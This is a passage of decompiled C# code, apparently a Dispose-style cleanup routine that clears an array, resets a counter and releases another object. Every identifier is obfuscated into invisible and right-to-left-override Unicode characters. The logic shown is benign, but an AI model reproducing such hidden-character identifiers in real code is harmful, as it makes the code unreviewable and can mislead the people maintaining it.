    }
    finally
    {
      ((\u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮) this).\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮();
    }
  }

  void \u200C⁫‮⁯‍‪‮⁫‬‎⁫‏‭⁫‍⁫‪‭​⁪‫⁪‭⁬⁫⁬‍‍‏‪⁭⁬‎‮‏⁮‎⁬⁭⁪‮.\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮()
  {
    Array.Clear((Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length);
    this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
    this.\u200F⁫‭⁫‪⁪‬‮⁪⁬​‌‫‌‭‮⁮⁯​‏‫‪‬⁮⁪‬⁬⁪⁭⁭‌⁮⁯​‬​⁪‍‮⁯‮.\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮();
  }
}
